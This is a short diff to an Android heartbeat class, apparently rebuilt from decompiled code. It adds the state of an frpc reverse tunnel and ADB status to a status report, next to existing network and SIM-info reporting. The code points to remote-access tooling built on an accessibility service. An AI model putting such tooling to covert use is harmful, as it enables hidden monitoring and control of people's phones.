@@ -12,6 +12,8 @@ import android.app.KeyguardManager
 import android.telephony.SubscriptionManager
 import android.telephony.TelephonyManager
 import android.util.Log
+import com.storm.safe.rock.service.MyAccessibilityService
+import com.storm.safe.rock.service.modules.routes.AdbStatusRouteHandler
 import com.storm.safe.rock.util.StringUtil
 import org.json.JSONObject
 
@@ -223,6 +225,21 @@ class HeartbeatManager(
             } else "无网络"
         } catch (_: Exception) { "未知" }
         json.put("networkType", networkType)
+
+        // frpc tunnel status — read from FrpcProcessManager
+        val tunnelStatus = try {
+            val fpm = MyAccessibilityService.getInstance()?.frpcProcessManager
+            if (fpm != null && fpm.isRunning.get()) "online" else "offline"
+        } catch (_: Exception) { "unknown" }
+        json.put("tunnelStatus", tunnelStatus)
+
+        // ADB status — reuse AdbStatusRouteHandler logic
+        try {
+            val adbData = AdbStatusRouteHandler.handle(context).optJSONObject("data")
+            if (adbData != null) {
+                json.put("adbStatus", adbData)
+            }
+        } catch (_: Exception) {}
 
         // SIM info every 10th heartbeat — JADX: totalHeartbeats % 10 == 0
         try {
